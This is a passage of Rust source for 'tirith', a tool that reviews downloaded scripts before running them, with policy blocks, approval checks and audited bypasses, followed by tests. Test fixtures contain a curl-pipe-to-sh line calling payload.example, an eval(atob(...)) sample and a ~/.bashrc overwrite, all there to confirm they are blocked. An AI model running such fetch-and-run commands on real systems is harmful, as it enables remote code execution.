    // analyzer table is intentionally no broader than this list, but both must
    // agree before an interpreter is invoked.
    if !opts.no_exec && !is_allowed_interpreter(&invocation.interpreter) {
        return Err(format!(
            "interpreter '{}' is not in the allowed list",
            invocation.interpreter
        ));
    }
    if !opts.no_exec && invocation.resolved_executable.is_none() {
        let selected = crate::trusted_child::resolve_forced_interpreter(&invocation.interpreter)
            .map_err(|error| {
                format!(
                    "cannot select trusted script interpreter '{}': {error}",
                    invocation.interpreter
                )
            })?;
        invocation.resolved_executable = Some(selected.bind_content().map_err(|error| {
            format!(
                "cannot bind trusted script interpreter '{}' before approval: {error}",
                invocation.interpreter
            )
        })?);
    }
    #[cfg(target_os = "linux")]
    if !opts.no_exec {
        require_native_bound_interpreter(&invocation)?;
    }

    let bypass_requested = std::env::var("TIRITH").ok().as_deref() == Some("0");
    let bypass_honored = if let Some(policy) = review.policy.clone() {
        // A generated `safe_command` is an enforcement boundary, not a user
        // request to weaken policy. Preserve `bypass_requested` for audit, but
        // make bypass unavailable for the typed stdin runner surface.
        let surface_allows_bypass = requested_pipe_invocation.is_none();
        apply_explicit_bypass(
            &mut review,
            &policy,
            bypass_requested,
            opts.interactive,
            surface_allows_bypass,
            !opts.no_exec,
        )
    } else {
        false
    };

    let receipt = Receipt {
        url: opts.url.clone(),
        final_url: Some(downloaded.final_url),
        redirects: downloaded.redirects,
        sha256: sha256.clone(),
        size: content.len() as u64,
        domains_referenced: review.legacy.domains_referenced.clone(),
        paths_referenced: review.legacy.paths_referenced.clone(),
        analysis_method: if review.analysis_complete {
            format!("policy-complete:{}", review.interpreter)
        } else {
            format!(
                "static-incomplete:{}",
                review.incomplete_reason.unwrap_or("unknown")
            )
        },
        privilege: if review.legacy.has_sudo {
            "elevated".to_string()
        } else {
            "normal".to_string()
        },
        timestamp: chrono::Utc::now().to_rfc3339(),
        cwd: cwd.as_ref().map(|p| p.display().to_string()),
        // Receipt collection must not execute ambient PATH helpers. Git metadata
        // stays absent until it can be derived without spawning an unbound tool.
        git_repo: None,
        git_branch: None,
    };

    if let (Some(_), Some(effective), Some(policy)) = (
        review.raw_verdict.as_ref(),
        review.effective_verdict.as_ref(),
        review.policy.as_ref(),
    ) {
        let (raw_action, raw_rule_ids) = raw_audit_fields(&review)
            .expect("raw verdict is present when the complete effective verdict is present");
        let audit_subject = format!("downloaded-script sha256:{sha256}");
        let audit_result = if bypass_honored && !opts.no_exec {
            crate::audit::log_verdict_with_raw_required(
                effective,
                &audit_subject,
                None,
                Some(uuid::Uuid::new_v4().to_string()),
                &policy.dlp_custom_patterns,
                Some(raw_action),
                Some(raw_rule_ids),
            )
        } else {
            crate::audit::log_verdict_with_raw(
                effective,
                &audit_subject,
                None,
                Some(uuid::Uuid::new_v4().to_string()),
                &policy.dlp_custom_patterns,
                Some(raw_action),
                Some(raw_rule_ids),
            )
        };
        enforce_required_bypass_audit(bypass_honored && !opts.no_exec, audit_result)?;
    }
    let result_verdict = redacted_result_verdict(&review);
    if let Some(display) = result_verdict.as_ref() {
        present_complete_verdict(display, std::io::stderr().lock())?;
    }

    if opts.no_exec {
        receipt.save().map_err(|e| format!("save receipt: {e}"))?;
        return Ok(RunResult {
            receipt,
            verdict: result_verdict,
            analysis_complete: review.analysis_complete,
            refused: false,
            executed: false,
            exit_code: None,
        });
    }

    let blocked = review
        .effective_verdict
        .as_ref()
        .is_some_and(|verdict| verdict.action == Action::Block);
    let approval_required = review
        .effective_verdict
        .as_ref()
        .is_some_and(|verdict| verdict.requires_approval == Some(true));
    // `tirith run` has no approval-completion flow. Its local y/N confirmation
    // is not a substitute for the policy approval contract, and TIRITH=0 may not
    // bypass it. Refuse before the generic prompt and before materialization.
    if approval_required || (blocked && !bypass_honored) {
        if approval_required {
            eprintln!(
                "tirith: execution refused: policy approval is required and this runner has no approval-completion flow"
            );
        }
        receipt.save().map_err(|e| format!("save receipt: {e}"))?;
        return Ok(RunResult {
            receipt,
            verdict: result_verdict,
            analysis_complete: review.analysis_complete,
            refused: true,
            executed: false,
            exit_code: Some(Action::Block.exit_code()),
        });
    }
    eprintln!(
        "tirith: downloaded {} bytes (SHA256: {})",
        content.len(),
        crate::receipt::short_hash(&sha256)
    );
    eprintln!("tirith: interpreter: {}", invocation.interpreter);
    if invocation.input_mode == ScriptInputMode::Stdin {
        eprintln!("tirith: script input: stdin");
    }
    if !invocation.args.is_empty() {
        eprintln!("tirith: interpreter argv: {:?}", invocation.args);
    }
    if bypass_honored {
        eprintln!(
            "tirith: blocking body verdict explicitly bypassed via TIRITH=0 (audited with raw findings)"
        );
    }

    let tty = fs::OpenOptions::new()
        .read(true)
        .write(true)
        .open("/dev/tty")
        .map_err(|_| "cannot open /dev/tty for confirmation")?;

    let mut tty_writer = io::BufWriter::new(&tty);
    write!(tty_writer, "Execute this script? [y/N] ").map_err(|e| format!("tty write: {e}"))?;
    tty_writer.flush().map_err(|e| format!("tty flush: {e}"))?;

    let mut reader = io::BufReader::new(&tty);
    let mut response_line = String::new();
    reader
        .read_line(&mut response_line)
        .map_err(|e| format!("tty read: {e}"))?;

    if !response_line.trim().eq_ignore_ascii_case("y") {
        eprintln!("tirith: execution cancelled");
        receipt.save().map_err(|e| format!("save receipt: {e}"))?;
        return Ok(RunResult {
            receipt,
            verdict: result_verdict,
            analysis_complete: review.analysis_complete,
            refused: false,
            executed: false,
            exit_code: None,
        });
    }

    receipt.save().map_err(|e| format!("save receipt: {e}"))?;

    // Never execute the stable content-addressed cache path. Materialize the
    // reviewed in-memory bytes into a fully sealed anonymous descriptor and
    // verify its digest through that still-open descriptor before launch.
    let execution = materialize_execution_file(&cache_dir, &content, &sha256)?;
    let execution_bytes = execution.read_verified(content.len(), &sha256)?;
    let reviewed_script = execution.reviewed(&execution_bytes);
    let exit_code = if let Some(exec) = verified_executor {
        Some(exec(&invocation, reviewed_script)?)
    } else {
        if invocation.input_mode != ScriptInputMode::File {
            return Err("forced stdin execution requires the capsule executor".to_string());
        }
        #[cfg(not(target_os = "linux"))]
        return Err("exact content-bound script execution is supported only on Linux".to_string());
        #[cfg(target_os = "linux")]
        let mut child = spawn_bound_reviewed_script(&invocation, reviewed_script)?;
        #[cfg(target_os = "linux")]
        let waited = child.wait();
        #[cfg(target_os = "linux")]
        let status = waited.map_err(|e| format!("execute wait: {e}"))?;
        #[cfg(target_os = "linux")]
        status.code()
    };

    Ok(RunResult {
        receipt,
        verdict: result_verdict,
        analysis_complete: review.analysis_complete,
        refused: false,
        executed: true,
        exit_code,
    })
}

/// Outcome of [`download_to_path`].
pub struct DownloadResult {
    /// The path the content was written to (the caller-supplied destination).
    pub path: std::path::PathBuf,
    /// SHA-256 of the downloaded content.
    pub sha256: String,
    /// Final URL after redirects.
    pub final_url: String,
    /// Number of bytes written.
    pub size: u64,
    /// Detected interpreter from the shebang (best-effort, for display).
    pub interpreter: String,
}

/// Download `url` to `dest` WITHOUT executing it (the primitive behind
/// `tirith fetch --save`). Shares [`run`]'s redirect / 30s-timeout / 10 MiB-cap
/// policy, verifies `expected_sha256`, and writes atomically (sibling temp +
/// rename, `0600`). Caller marks `dest` tainted (see `crate::taint`).
pub fn download_to_path(
    url: &str,
    dest: &std::path::Path,
    expected_sha256: Option<&str>,
) -> Result<DownloadResult, String> {
    let downloaded = download_bounded(url, expected_sha256, DownloadPurpose::SaveOnly)?;
    let content = downloaded.content;
    let sha256 = downloaded.sha256;

    // Atomic write: sibling temp + rename, 0600.
    let dir = dest.parent().filter(|p| !p.as_os_str().is_empty());
    if let Some(parent) = dir {
        fs::create_dir_all(parent).map_err(|e| format!("create dest dir: {e}"))?;
    }
    let tmp_dir = dir.unwrap_or_else(|| std::path::Path::new("."));
    {
        use tempfile::NamedTempFile;
        let mut tmp = NamedTempFile::new_in(tmp_dir).map_err(|e| format!("tempfile: {e}"))?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            tmp.as_file()
                .set_permissions(std::fs::Permissions::from_mode(0o600))
                .map_err(|e| format!("permissions: {e}"))?;
        }
        tmp.write_all(&content)
            .map_err(|e| format!("write download: {e}"))?;
        // fsync bytes before rename so a crash can't leave a partial file at dest.
        tmp.as_file()
            .sync_all()
            .map_err(|e| format!("sync download: {e}"))?;
        tmp.persist(dest)
            .map_err(|e| format!("persist download: {e}"))?;
        // Also fsync the parent dir so the rename survives a crash (CodeRabbit
        // R9 #B). Best-effort: a dir-fsync failure is logged not propagated (R13 #5).
        crate::util::fsync_parent_dir_logged(dest, "downloaded script");
    }

    let content_str = String::from_utf8_lossy(&content);
    let interpreter = script_analysis::detect_interpreter(&content_str).to_string();

    Ok(DownloadResult {
        path: dest.to_path_buf(),
        sha256,
        final_url: downloaded.final_url,
        size: content.len() as u64,
        interpreter,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    #[cfg(unix)]
    use std::process::Command;

    #[test]
    fn execution_transport_rejects_http_without_pin() {
        let err = validate_download_request(
            "http://downloads.example/install.sh",
            None,
            DownloadPurpose::Execute,
        )
        .expect_err("unpinned HTTP executable download must fail");
        assert!(err.contains("HTTPS"));
    }

    #[test]
    fn execution_transport_allows_direct_http_with_valid_compatibility_pin() {
        let parsed = url::Url::parse("http://downloads.example/install.sh").unwrap();
        validate_initial_transport(&parsed, true, DownloadPurpose::Execute)
            .expect("a valid digest pin authenticates a direct HTTP compatibility download");
    }

    #[test]
    fn execution_transport_rejects_https_downgrade_even_with_pin() {
        let previous = url::Url::parse("https://downloads.example/install.sh").unwrap();
        let target = url::Url::parse("http://cdn.example/install.sh").unwrap();
        let err = validate_redirect_target(&previous, &target, DownloadPurpose::Execute)
            .expect_err("execution redirects must never downgrade HTTPS");
        assert!(err.contains("redirect") && err.contains("HTTPS"));
    }

    #[test]
    fn non_executing_download_keeps_http_compatibility() {
        let parsed = url::Url::parse("http://downloads.example/archive.txt").unwrap();
        validate_initial_transport(&parsed, false, DownloadPurpose::SaveOnly)
            .expect("save-only downloads retain the existing HTTP contract");
    }

    #[test]
    fn unsuccessful_status_is_rejected_before_body_handling() {
        let err = require_success_status(reqwest::StatusCode::NOT_FOUND)
            .expect_err("an HTTP error body must not become script content");
        assert!(err.contains("404"));
    }

    #[test]
    fn malformed_pin_wins_before_url_or_network_validation() {
        let err =
            validate_download_request("not a URL", Some("not-a-sha256"), DownloadPurpose::Execute)
                .expect_err("malformed digest must be rejected first");
        assert!(err.starts_with("invalid SHA-256 pin:"), "{err}");
    }

    #[test]
    fn blocking_shell_content_produces_a_blocking_review() {
        let dir = tempfile::tempdir().unwrap();
        let review = review_script_bytes(
            b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n",
            true,
            false,
            Some(dir.path()),
            None,
        )
        .expect("supported UTF-8 shell content must be analyzed");
        assert!(review.analysis_complete);
        assert_eq!(
            review.raw_verdict.unwrap().action,
            crate::verdict::Action::Block
        );
    }

    #[test]
    fn appended_codefile_finding_uses_frozen_policy_severity_override() {
        let mut verdict = Verdict::allow_fast(1, crate::verdict::Timings::default());
        let mut policy = crate::policy::Policy::default();
        policy.severity_overrides.insert(
            "dynamic_code_execution".to_string(),
            crate::verdict::Severity::High,
        );
        append_policy_aware_codefile_findings(
            &mut verdict,
            &policy,
            r#"eval(atob("SGVsbG8gV29ybGQ="))"#,
            Some("downloaded-script.sh"),
        );
        let finding = verdict
            .findings
            .iter()
            .find(|finding| finding.rule_id == crate::verdict::RuleId::DynamicCodeExecution)
            .expect("code-file-only finding");
        assert_eq!(finding.severity, crate::verdict::Severity::High);
        assert_eq!(verdict.action, Action::Block);
    }

    #[test]
    fn verdict_presentation_and_required_bypass_audit_fail_closed() {
        struct FailingWriter;
        impl std::io::Write for FailingWriter {
            fn write(&mut self, _bytes: &[u8]) -> std::io::Result<usize> {
                Err(std::io::Error::new(
                    std::io::ErrorKind::BrokenPipe,
                    "injected renderer failure",
                ))
            }

            fn flush(&mut self) -> std::io::Result<()> {
                Ok(())
            }
        }

        let verdict = Verdict::from_findings(
            vec![crate::verdict::Finding {
                rule_id: crate::verdict::RuleId::CurlPipeShell,
                severity: crate::verdict::Severity::High,
                title: "fixture".to_string(),
                description: "fixture".to_string(),
                evidence: Vec::new(),
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            }],
            1,
            crate::verdict::Timings::default(),
        );
        let render_error = present_complete_verdict(&verdict, FailingWriter)
            .expect_err("a verdict that was not presented cannot reach confirmation");
        assert!(
            render_error.contains("could not be presented"),
            "{render_error}"
        );

        let audit_error =
            enforce_required_bypass_audit(true, Err("injected durable audit failure".to_string()))
                .expect_err("a live bypass without durable audit cannot reach confirmation");
        assert!(
            audit_error.contains("required audit record"),
            "{audit_error}"
        );
        assert!(enforce_required_bypass_audit(false, Err("best effort".to_string())).is_ok());
    }

    #[test]
    fn invalid_utf8_and_unsupported_interpreters_refuse_only_execution() {
        let dir = tempfile::tempdir().unwrap();
        let invalid = b"#!/bin/sh\n\xff\n";
        assert!(review_script_bytes(invalid, true, false, Some(dir.path()), None).is_err());
        let inspect = review_script_bytes(invalid, false, false, Some(dir.path()), None)
            .expect("--no-exec must retain incomplete inspection");
        assert!(!inspect.analysis_complete);

        let unsupported = b"#!/usr/bin/awk -f\nBEGIN { print \"ok\" }\n";
        assert!(review_script_bytes(unsupported, true, false, Some(dir.path()), None).is_err());
        let inspect = review_script_bytes(unsupported, false, false, Some(dir.path()), None)
            .expect("--no-exec must retain unsupported-interpreter inspection");
        assert!(!inspect.analysis_complete);
    }

    #[test]
    fn forced_shell_review_ignores_remote_python_and_node_shebangs() {
        let dir = tempfile::tempdir().unwrap();
        for content in [
            b"#!/usr/bin/env python3\nprint('remote python')\n".as_slice(),
            b"#!/usr/bin/env node\nconsole.log('remote node')\n".as_slice(),
        ] {
            let review = review_script_bytes(content, true, false, Some(dir.path()), Some("bash"))
                .expect("forced bash has a complete shell analyzer");
            assert_eq!(review.interpreter, "bash");
            assert!(review.analysis_complete);
        }
    }

    #[test]
    fn pipe_interpreter_argv_contract_is_narrow() {
        assert!(pipe_interpreter_args_supported(PipeInterpreter::Bash, &[]));
        assert!(pipe_interpreter_args_supported(
            PipeInterpreter::Bash,
            &["-s".into(), "--".into(), "feature".into()]
        ));
        assert!(!pipe_interpreter_args_supported(
            PipeInterpreter::Bash,
            &["-e".into()]
        ));
        assert!(!pipe_interpreter_args_supported(
            PipeInterpreter::Fish,
            &["-s".into(), "--".into()]
        ));
        assert!(!pipe_interpreter_args_supported(
            PipeInterpreter::Bash,
            &["-s".into(), "--".into(), "bad\rarg".into()]
        ));
    }

    #[test]
    fn legacy_path_executor_shape_is_retained_but_live_execution_fails_before_io() {
        use std::sync::atomic::{AtomicBool, Ordering};
        use std::sync::Arc;

        let called = Arc::new(AtomicBool::new(false));
        let callback_called = Arc::clone(&called);
        let options = RunOptions {
            url: "not-a-url".to_string(),
            no_exec: false,
            interactive: true,
            expected_sha256: None,
            // Keep the original public callback arity and argument types. The
            // value may still be constructed by downstream code, but live use
            // must be rejected before URL parsing, prompting, or invocation.
            exec_fn: Some(Box::new(move |_, _| {
                callback_called.store(true, Ordering::Release);
                Ok(0)
            })),
        };

        let error = match run(options) {
            Ok(_) => panic!("legacy live executor unexpectedly ran"),
            Err(error) => error,
        };
        assert!(
            error.contains("legacy path-based script executors"),
            "{error}"
        );
        assert!(
            !error.contains("invalid URL"),
            "network parsing ran: {error}"
        );
        assert!(!called.load(Ordering::Acquire));
    }

    #[test]
    fn no_exec_full_run_never_invokes_legacy_callback_or_executes_blocked_body() {
        use std::ffi::OsString;
        use std::io::{Read as _, Write as _};
        use std::sync::atomic::{AtomicBool, Ordering};
        use std::sync::Arc;

        struct EnvRestore(Vec<(&'static str, Option<OsString>)>);
        impl EnvRestore {
            fn set(&mut self, name: &'static str, value: Option<impl AsRef<std::ffi::OsStr>>) {
                self.0.push((name, std::env::var_os(name)));
                unsafe {
                    match value {
                        Some(value) => std::env::set_var(name, value),
                        None => std::env::remove_var(name),
                    }
                }
            }
        }
        impl Drop for EnvRestore {
            fn drop(&mut self) {
                for (name, value) in self.0.drain(..).rev() {
                    unsafe {
                        match value {
                            Some(value) => std::env::set_var(name, value),
                            None => std::env::remove_var(name),
                        }
                    }
                }
            }
        }

        let _lock = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|error| error.into_inner());
        let isolated = tempfile::tempdir().unwrap();
        let mut env = EnvRestore(Vec::new());
        env.set("HOME", Some(isolated.path()));
        env.set("XDG_CONFIG_HOME", Some(isolated.path().join("config")));
        env.set("XDG_DATA_HOME", Some(isolated.path().join("data")));
        env.set("XDG_STATE_HOME", Some(isolated.path().join("state")));
        env.set("XDG_CACHE_HOME", Some(isolated.path().join("cache")));
        env.set("TIRITH_POLICY_ROOT", Some(isolated.path()));
        env.set("TIRITH_PRIVATE_FETCH_ALLOW", Some("127.0.0.1/32"));
        env.set("NO_PROXY", Some("127.0.0.1,localhost"));
        env.set("TIRITH_SERVER_URL", None::<&str>);
        env.set("TIRITH_API_KEY", None::<&str>);
        env.set("TIRITH_LOG", Some("0"));

        let body: &'static [u8] =
            b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n";
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let address = listener.local_addr().unwrap();
        let server = std::thread::spawn(move || {
            let (mut stream, _) = listener.accept().unwrap();
            let mut request = [0u8; 2048];
            let _ = stream.read(&mut request);
            write!(
                stream,
                "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                body.len()
            )
            .unwrap();
            stream.write_all(body).unwrap();
        });
        let called = Arc::new(AtomicBool::new(false));
        let callback_called = Arc::clone(&called);
        let result = run(RunOptions {
            url: format!("http://{address}/inspect.sh"),
            no_exec: true,
            interactive: false,
            expected_sha256: None,
            exec_fn: Some(Box::new(move |_, _| {
                callback_called.store(true, Ordering::Release);
                panic!("--no-exec invoked legacy callback")
            })),
        })
        .expect("analysis-only run completes");
        server.join().unwrap();
        assert!(!result.executed);
        assert!(!result.refused, "--no-exec is analysis, not a live refusal");
        assert!(!called.load(Ordering::Acquire));
        assert_eq!(result.verdict.unwrap().action, Action::Block);
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn macos_forced_stdin_refuses_before_network_or_executor() {
        let options = RunOptions {
            url: "not-a-url".to_string(),
            no_exec: false,
            interactive: true,
            expected_sha256: None,
            exec_fn: None,
        };

        let error = match run_with_verified_pipe_executor(
            options,
            RequestedPipeInvocation {
                interpreter: PipeInterpreter::Sh,
                args: Vec::new(),
            },
            Box::new(|_, _| panic!("macOS refusal must happen before interpreter execution")),
        ) {
            Ok(_) => panic!("macOS stdin execution must fail closed"),
            Err(error) => error,
        };
        assert!(error.contains("supported only on Linux"), "{error}");
        assert!(error.contains("before download"), "{error}");
        assert!(
            !error.contains("invalid URL"),
            "network validation ran: {error}"
        );
    }

    #[cfg(unix)]
    #[test]
    fn bash_s_double_dash_reads_reviewed_bytes_from_stdin() {
        let content = b"#!/usr/bin/env node\nprintf '<%s>\\n' \"$1\"\n";
        // A Unix host without bash is a real target (busybox on Alpine), so a
        // missing interpreter is not a failure of this contract.
        let Ok(mut child) = Command::new("bash")
            .args(["-s", "--", "feature"])
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .spawn()
        else {
            eprintln!("skipping: bash is not installed on this host");
            return;
        };
        child
            .stdin
            .take()
            .unwrap()
            .write_all(content)
            .expect("write reviewed bytes");
        let output = child.wait_with_output().expect("wait bash");
        assert!(output.status.success());
        assert_eq!(output.stdout, b"<feature>\n");
    }

    #[test]
    fn authorized_bypass_retains_raw_block_findings() {
        let dir = tempfile::tempdir().unwrap();
        let mut review = review_script_bytes(
            b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n",
            true,
            false,
            Some(dir.path()),
            None,
        )
        .unwrap();
        let raw_count = review.raw_verdict.as_ref().unwrap().findings.len();
        let mut policy = crate::policy::Policy {
            allow_bypass_env: true,
            ..crate::policy::Policy::default()
        };
        policy.allow_bypass_env_noninteractive = false;
        assert!(apply_explicit_bypass(
            &mut review,
            &policy,
            true,
            true,
            true,
            true,
        ));
        assert_eq!(
            review.raw_verdict.as_ref().unwrap().findings.len(),
            raw_count
        );
        assert_eq!(
            review.effective_verdict.as_ref().unwrap().findings.len(),
            raw_count
        );
        assert!(review.effective_verdict.as_ref().unwrap().bypass_honored);
        let (raw_action, raw_rule_ids) = raw_audit_fields(&review).unwrap();
        assert_eq!(raw_action, "Block");
        assert_eq!(raw_rule_ids.len(), raw_count);
    }

    #[test]
    fn bypass_is_not_honored_for_allow_or_analysis_only_verdicts() {
        let dir = tempfile::tempdir().unwrap();
        let policy = crate::policy::Policy {
            allow_bypass_env: true,
            allow_bypass_env_noninteractive: true,
            ..crate::policy::Policy::default()
        };

        let mut clean = review_script_bytes(
            b"#!/bin/sh\nprintf 'clean\\n'\n",
            true,
            false,
            Some(dir.path()),
            None,
        )
        .unwrap();
        assert!(!apply_explicit_bypass(
            &mut clean, &policy, true, true, true, true
        ));
        let clean_verdict = clean.effective_verdict.unwrap();
        assert!(clean_verdict.bypass_requested);
        assert!(clean_verdict.bypass_available);
        assert!(!clean_verdict.bypass_honored);

        let mut blocked = review_script_bytes(
            b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n",
            false,
            false,
            Some(dir.path()),
            None,
        )
        .unwrap();
        assert_eq!(
            blocked.effective_verdict.as_ref().unwrap().action,
            Action::Block
        );
        assert!(!apply_explicit_bypass(
            &mut blocked,
            &policy,
            true,
            true,
            true,
            false,
        ));
        let blocked_verdict = blocked.effective_verdict.unwrap();
        assert!(blocked_verdict.bypass_requested);
        assert!(blocked_verdict.bypass_available);
        assert!(!blocked_verdict.bypass_honored);
    }

    #[test]
    fn forced_stdin_surface_records_but_never_honors_explicit_bypass() {
        let dir = tempfile::tempdir().unwrap();
        let mut review = review_script_bytes(
            b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n",
            true,
            false,
            Some(dir.path()),
            Some("bash"),
        )
        .unwrap();
        let policy = crate::policy::Policy {
            allow_bypass_env: true,
            allow_bypass_env_noninteractive: true,
            ..crate::policy::Policy::default()
        };
        assert!(!apply_explicit_bypass(
            &mut review,
            &policy,
            true,
            true,
            false,
            true,
        ));
        for verdict in [
            review.raw_verdict.as_ref().unwrap(),
            review.effective_verdict.as_ref().unwrap(),
        ] {
            assert!(verdict.bypass_requested);
            assert!(!verdict.bypass_available);
            assert!(!verdict.bypass_honored);
            assert_eq!(verdict.action, Action::Block);
        }
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn forced_stdin_run_blocks_reviewed_body_even_with_tirith_zero() {
        use std::ffi::OsString;
        use std::io::{Read as _, Write as _};
        use std::sync::atomic::{AtomicBool, Ordering};
        use std::sync::Arc;
        use std::time::{Duration, Instant};

        struct EnvRestore(Vec<(&'static str, Option<OsString>)>);
        impl EnvRestore {
            fn set(&mut self, name: &'static str, value: impl AsRef<std::ffi::OsStr>) {
                if !self.0.iter().any(|(seen, _)| *seen == name) {
                    self.0.push((name, std::env::var_os(name)));
                }
                // SAFETY: this test holds the crate-wide environment mutex.
                unsafe { std::env::set_var(name, value) };
            }
        }
        impl Drop for EnvRestore {
            fn drop(&mut self) {
                for (name, value) in self.0.drain(..).rev() {
                    // SAFETY: this guard is dropped while the environment mutex is held.
                    unsafe {
                        match value {
                            Some(value) => std::env::set_var(name, value),
                            None => std::env::remove_var(name),
                        }
                    }
                }
            }
        }

        let _env_lock = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|error| error.into_inner());
        let isolated = tempfile::tempdir().expect("isolated runner state");
        std::fs::create_dir_all(isolated.path().join(".tirith")).unwrap();
        std::fs::write(
            isolated.path().join(".tirith/policy.yaml"),
            "allow_bypass_env: true\nallow_bypass_env_noninteractive: true\n",
        )
        .unwrap();
        let mut env = EnvRestore(Vec::new());
        env.set("TIRITH", "0");
        env.set("TIRITH_PRIVATE_FETCH_ALLOW", "127.0.0.1/32");
        env.set("TIRITH_POLICY_ROOT", isolated.path());
        env.set("HOME", isolated.path());
        env.set("XDG_CONFIG_HOME", isolated.path().join("config"));
        env.set("XDG_CACHE_HOME", isolated.path().join("cache"));
        env.set("XDG_STATE_HOME", isolated.path().join("state"));
        env.set("NO_PROXY", "127.0.0.1,localhost");

        let body = b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n";
        let expected_sha256 = sha256_hex(body);
        let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind test server");
        listener.set_nonblocking(true).unwrap();
        let address = listener.local_addr().unwrap();
        let stop = Arc::new(AtomicBool::new(false));
        let stop_server = Arc::clone(&stop);
        let server = std::thread::spawn(move || {
            let deadline = Instant::now() + Duration::from_secs(10);
            while !stop_server.load(Ordering::Acquire) && Instant::now() < deadline {
                match listener.accept() {
                    Ok((mut stream, _)) => {
                        stream
                            .set_read_timeout(Some(Duration::from_secs(2)))
                            .unwrap();
                        let mut request = [0u8; 2048];
                        let _ = stream.read(&mut request);
                        write!(
                            stream,
                            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                            body.len()
                        )
                        .unwrap();
                        stream.write_all(body).unwrap();
                        stream.flush().unwrap();
                        return;
                    }
                    Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {
                        std::thread::sleep(Duration::from_millis(10));
                    }
                    Err(error) => panic!("test server accept failed: {error}"),
                }
            }
        });

        let executor_called = Arc::new(AtomicBool::new(false));
        let called = Arc::clone(&executor_called);
        let result = run_with_verified_pipe_executor(
            RunOptions {
                url: format!("http://{address}/install.sh"),
                no_exec: false,
                interactive: true,
                expected_sha256: Some(expected_sha256),
                exec_fn: None,
            },
            RequestedPipeInvocation {
                interpreter: PipeInterpreter::Bash,
                args: Vec::new(),
            },
            Box::new(move |_, _| {
                called.store(true, Ordering::Release);
                panic!("blocked reviewed body reached the executor")
            }),
        )
        .expect("blocked download returns a refusal receipt");
        stop.store(true, Ordering::Release);
        server.join().expect("join test server");

        assert!(result.refused);
        assert!(!result.executed);
        assert_eq!(result.exit_code, Some(Action::Block.exit_code()));
        assert!(!executor_called.load(Ordering::Acquire));
        let verdict = result.verdict.expect("effective blocking verdict");
        assert!(verdict.bypass_requested);
        assert!(!verdict.bypass_available);
        assert!(!verdict.bypass_honored);
        assert_eq!(verdict.action, Action::Block);
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn pending_policy_approval_refuses_before_prompt_or_verified_executor() {
        use std::ffi::OsString;
        use std::io::{Read as _, Write as _};
        use std::sync::atomic::{AtomicBool, Ordering};
        use std::sync::Arc;
        use std::time::{Duration, Instant};

        struct PendingApprovalEnvRestore(Vec<(&'static str, Option<OsString>)>);
        impl PendingApprovalEnvRestore {
            fn set(&mut self, name: &'static str, value: impl AsRef<std::ffi::OsStr>) {
                if !self.0.iter().any(|(seen, _)| *seen == name) {
                    self.0.push((name, std::env::var_os(name)));
                }
                // SAFETY: this test holds the crate-wide environment mutex.
                unsafe { std::env::set_var(name, value) };
            }
        }
        impl Drop for PendingApprovalEnvRestore {
            fn drop(&mut self) {
                for (name, value) in self.0.drain(..).rev() {
                    // SAFETY: this guard is dropped while the environment mutex is held.
                    unsafe {
                        match value {
                            Some(value) => std::env::set_var(name, value),
                            None => std::env::remove_var(name),
                        }
                    }
                }
            }
        }

        let _env_lock = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|error| error.into_inner());
        let isolated = tempfile::tempdir().expect("isolated approval runner state");
        std::fs::create_dir_all(isolated.path().join(".tirith")).unwrap();
        // Plain concatenation, NOT `\`-continuations: a continuation strips the
        // next line's leading whitespace, which silently deletes the YAML
        // indentation and turns `severity_overrides` into an empty map.
        std::fs::write(
            isolated.path().join(".tirith/policy.yaml"),
            concat!(
                "allow_bypass_env: true\n",
                "severity_overrides:\n",
                "  dotfile_overwrite: INFO\n",
                "approval_rules:\n",
                "  - rule_ids: [dotfile_overwrite]\n",
                "    timeout_secs: 30\n",
                "    fallback: block\n",
            ),
        )
        .unwrap();
        let mut env = PendingApprovalEnvRestore(Vec::new());
        env.set("TIRITH", "0");
        env.set("TIRITH_PRIVATE_FETCH_ALLOW", "127.0.0.1/32");
        env.set("TIRITH_POLICY_ROOT", isolated.path());
        env.set("HOME", isolated.path());
        env.set("XDG_CONFIG_HOME", isolated.path().join("config"));
        env.set("XDG_CACHE_HOME", isolated.path().join("cache"));
        env.set("XDG_STATE_HOME", isolated.path().join("state"));
        env.set("NO_PROXY", "127.0.0.1,localhost");

        let body: &'static [u8] = b"#!/bin/sh\necho reviewed > ~/.bashrc\n";
        let expected_sha256 = sha256_hex(body);
        let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind test server");
        listener.set_nonblocking(true).unwrap();
        let address = listener.local_addr().unwrap();
        let stop = Arc::new(AtomicBool::new(false));
        let stop_server = Arc::clone(&stop);
        let server = std::thread::spawn(move || {
            let deadline = Instant::now() + Duration::from_secs(10);
            while !stop_server.load(Ordering::Acquire) && Instant::now() < deadline {
                match listener.accept() {
                    Ok((mut stream, _)) => {
                        stream
                            .set_read_timeout(Some(Duration::from_secs(2)))
                            .unwrap();
                        let mut request = [0u8; 2048];
                        let _ = stream.read(&mut request);
                        write!(
                            stream,
                            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                            body.len()
                        )
                        .unwrap();
                        stream.write_all(body).unwrap();
                        stream.flush().unwrap();
                        return;
                    }
                    Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {
                        std::thread::sleep(Duration::from_millis(10));
